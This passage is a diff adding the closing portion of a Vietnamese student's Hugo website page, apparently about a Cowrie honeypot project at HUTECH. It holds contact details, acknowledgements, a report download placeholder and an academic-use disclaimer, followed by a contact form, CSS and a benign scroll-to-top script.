+<h2 id="-đóng-góp--liên-hệ" class="relative group">🤝 Đóng góp &amp; Liên hệ <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#-%c4%91%c3%b3ng-g%c3%b3p--li%c3%aan-h%e1%bb%87" aria-label="Anchor">#</a></span></h2><p>Dự án này là kết quả của quá trình học tập và nghiên cứu tại HUTECH. Chúng tôi rất mong nhận được feedback và ý kiến đóng góp!</p>
+<p><strong>Liên hệ:</strong></p>
+<ul>
+<li><strong>Email:</strong> <a href="mailto:2280600424@student.hutech.edu.vn">2280600424@student.hutech.edu.vn</a></li>
+<li><strong>GitHub:</strong> [Xem source code] (nếu public)</li>
+<li><strong>LinkedIn:</strong> <a href="#">Triệu Xuân Dũng</a></li>
+</ul>
+<p><strong>Lời cảm ơn:</strong></p>
+<p>Chúng tôi xin chân thành cảm ơn:</p>
+<ul>
+<li>ThS. Phan Đình Duy Thông - Giảng viên hướng dẫn tận tình</li>
+<li>Khoa Công nghệ Thông tin - HUTECH</li>
+<li>Honeynet Project community</li>
+<li>Cowrie development team</li>
+</ul>
+<hr>
+<h2 id="-báo-cáo-đầy-đủ" class="relative group">📄 Báo cáo đầy đủ <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#-b%c3%a1o-c%c3%a1o-%c4%91%e1%ba%a7y-%c4%91%e1%bb%a7" aria-label="Anchor">#</a></span></h2><p>Để xem báo cáo chi tiết với phân tích lý thuyết đầy đủ, vui lòng tham khảo:</p>
+<p>📥 <a href="#">Download Báo cáo đồ án (PDF)</a> - 57 trang</p>
+<hr>
+<div class="mt-12 p-6 bg-primary-100 dark:bg-primary-900 rounded-lg">
+  <h3 class="text-xl font-bold mb-4">🎓 Dự án học thuật</h3>
+  <p class="mb-4">
+    Đây là đồ án cơ sở được thực hiện với mục đích học tập và nghiên cứu. 
+    Hệ thống được triển khai trong môi trường cô lập, không gây ảnh hưởng đến bất kỳ mạng thực tế nào.
+  </p>
+  <p class="text-sm opacity-75">
+    Mọi kỹ thuật và công cụ được trình bày chỉ nhằm mục đích giáo dục về an ninh mạng.
+  </p>
+</div>
+    </section>
+    <footer class="pt-8">
+      
+
+    </footer>
+  </article>
+
+      </main>
+      
+<section class="contact-section-global">
+    <div class="contact-wrapper-global">
+        <h2 class="contact-title-global">Let me know what's on your mind</h2>
+        <form class="contact-form-global">
+            <div class="form-row-global">
+                <div>
+                    <label>First name *</label>
+                    <input type="text" required>
+                </div>
+                <div>
+                    <label>Last name *</label>
+                    <input type="text" required>
+                </div>
+            </div>
+            <div class="form-group-global">
+                <label>Email *</label>
+                <input type="email" required>
+            </div>
+            <div class="form-group-global">
+                <label>Leave us a message...</label>
+                <textarea rows="4"></textarea>
+            </div>
+            <button type="submit" class="btn-submit-global">Submit</button>
+        </form>
+    </div>
+</section>
+
+
+<footer class="custom-footer-compact">
+    <div class="footer-inner">
+        <p class="footer-text">
+            © 2025 Triệu Xuân Dũng • 
+            Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a>  
+            
+        </p>
+    </div>
+    
+    
+    <button id="scrollToTop" class="scroll-btn" aria-label="Scroll to top">↑</button>
+</footer>
+
+<style>
+ 
+
+.contact-section-global {
+    width: 100vw;
+    position: relative;
+    left: 50%;
+    right: 50%;
+    margin-left: -50vw;
+    margin-right: -50vw;
+    background: #FDF6F0;
+    padding: 2.5rem 0;
+    margin-top: 3rem;
+    margin-bottom: 0;
+}
+
+.contact-wrapper-global {
+    max-width: 600px;
+    margin: 0 auto;
+    padding: 0 1.5rem;
+}
+
+.contact-title-global {
+    font-size: 1.75rem;
+    font-weight: 700;
+    text-align: center;
+    margin-bottom: 1.75rem;
+    color: #1f2937;
+}
+
+.contact-form-global {
+    display: flex;
+    flex-direction: column;
+    gap: 1.25rem;
+}
+
+.form-row-global {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1.25rem;
+}
+
+.form-row-global label,
+.form-group-global label {
+    display: block;
+    font-size: 0.813rem;
+    margin-bottom: 0.4rem;
+    color: #4b5563;
+}
+
+.form-row-global input,
+.form-group-global input,
+.form-group-global textarea {
+    width: 100%;
+    padding: 0.625rem 0;
+    border: none;
+    border-bottom: 1px solid #d1d5db;
+    background: transparent;
+    font-size: 0.875rem;
+    transition: border-color 0.3s ease;
+}
+
+.form-row-global input:focus,
+.form-group-global input:focus,
+.form-group-global textarea:focus {
+    outline: none;
+    border-bottom-color: #667eea;
+}
+
+.form-group-global textarea {
+    resize: vertical;
+    font-family: inherit;
+}
+
+.btn-submit-global {
+    display: block;
+    margin: 1rem auto 0;
+    padding: 0.75rem 2rem;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+    border: none;
+    font-weight: 600;
+    font-size: 0.875rem;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+}
+
+.btn-submit-global:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
+}
+
+ 
+
+.custom-footer-compact {
+    width: 100vw;
+    position: relative;
+    left: 50%;
+    right: 50%;
+    margin-left: -50vw;
+    margin-right: -50vw;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+    padding: 1.5rem 0;
+    margin-top: 0;
+    border-top: 1px solid rgba(255, 255, 255, 0.2);
+}
+
+.footer-inner {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 2rem;
+    text-align: center;
+}
+
+.footer-text {
+    font-size: 0.875rem;
+    margin: 0;
+    opacity: 0.9;
+    line-height: 1.5;
+}
+
+.footer-text a {
+    color: white;
+    text-decoration: underline;
+    text-underline-offset: 2px;
+    transition: opacity 0.3s ease;
+}
+
+.footer-text a:hover {
+    opacity: 0.7;
+}
+
+ 
+.scroll-btn {
+    position: fixed;
+    bottom: 1.5rem;
+    right: 1.5rem;
+    width: 45px;
+    height: 45px;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+    border: 2px solid rgba(255, 255, 255, 0.3);
+    border-radius: 50%;
+    cursor: pointer;
+    font-size: 1.25rem;
+    font-weight: bold;
+    box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
+    transition: all 0.3s ease;
+    opacity: 0;
+    visibility: hidden;
+    z-index: 999;
+}
+
+.scroll-btn.visible {
+    opacity: 1;
+    visibility: visible;
+}
+
+.scroll-btn:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 6px 16px rgba(102, 126, 234, 0.5);
+    background: linear-gradient(135deg, #7c82f5 0%, #8654b3 100%);
+}
+
+ 
+
+@media (max-width: 768px) {
+    .contact-section-global {
+        padding: 2rem 0;
+        margin-top: 2rem;
+    }
+    
+    .contact-wrapper-global {
+        padding: 0 1rem;
+    }
+    
+    .contact-title-global {
+        font-size: 1.5rem;
+    }
+    
+    .form-row-global {
+        grid-template-columns: 1fr;
+        gap: 1rem;
+    }
+    
+    .custom-footer-compact {
+        padding: 1.25rem 0;
+    }
+    
+    .footer-text {
+        font-size: 0.75rem;
+    }
+    
+    .scroll-btn {
+        bottom: 1rem;
+        right: 1rem;
+        width: 40px;
+        height: 40px;
+        font-size: 1.125rem;
+    }
+}
+
+@media (max-width: 480px) {
+    .footer-text {
+        font-size: 0.7rem;
+    }
+}
+
+ 
+
+.dark .contact-section-global {
+    background: var(--color-neutral-900);
+}
+
+.dark .contact-title-global {
+    color: var(--color-neutral-100);
+}
+
+.dark .form-row-global input,
+.dark .form-group-global input,
+.dark .form-group-global textarea {
+    color: var(--color-neutral-100);
+    border-bottom-color: var(--color-neutral-700);
+}
+
+.dark .form-row-global label,
+.dark .form-group-global label {
+    color: var(--color-neutral-400);
+}
+
+.dark .custom-footer-compact {
+    background: linear-gradient(135deg, #4c51bf 0%, #553c9a 100%);
+}
+
+.dark .scroll-btn {
+    background: linear-gradient(135deg, #4c51bf 0%, #553c9a 100%);
+}
+
+.dark .scroll-btn:hover {
+    background: linear-gradient(135deg, #5b61d6 0%, #6b4bb0 100%);
+}
+</style>
+
+<script>
+
+document.addEventListener('DOMContentLoaded', function() {
+    const scrollBtn = document.getElementById('scrollToTop');
+    
+    if (scrollBtn) {
+        window.addEventListener('scroll', function() {
+            if (window.pageYOffset > 300) {
+                scrollBtn.classList.add('visible');
+            } else {
+                scrollBtn.classList.remove('visible');
+            }
+        });
+        
+        scrollBtn.addEventListener('click', function() {
+            window.scrollTo({
+                top: 0,
+                behavior: 'smooth'
+            });
+        });
+    }
+});
+</script>
+    </div>
+  </body>
+</html>
